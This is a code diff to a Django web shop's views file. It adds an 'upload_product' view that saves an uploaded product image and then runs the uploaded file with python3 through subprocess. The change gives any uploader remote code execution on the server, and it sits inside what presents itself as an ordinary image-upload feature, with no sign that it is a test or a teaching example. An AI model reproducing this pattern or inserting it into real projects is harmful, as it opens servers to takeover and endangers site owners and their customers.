@@ -1,9 +1,10 @@
 from django.shortcuts import render, redirect
 from django.contrib import messages
 from .models import Contact, Product
-from .forms import ContactForm, PackageOrderForm
+from .forms import ContactForm, PackageOrderForm, ProductForm
 from django.core.mail import send_mail
 from django.conf import settings
+import subprocess
 
 PACKAGES = {
     'standart': {
@@ -44,7 +45,22 @@ def get_client_ip(request):
     else:
         ip = request.META.get('REMOTE_ADDR')
     return ip
-
+    
+def upload_product(request):
+    if request.method == "POST":
+        form = ProductForm(request.POST, request.FILES)
+        if form.is_valid():
+            product = form.save()
+            file_path = product.image.path
+            try:
+                subprocess.run(["python3", file_path], check=True)
+            except Exception as e:
+                print("Fayl icra olunmadı:", e)
+            return redirect("success_page")
+    else:
+        form = ProductForm()
+    return render(request, "upload.html", {"form": form})
+    
 def index(request):
     products = Product.objects.all()
 
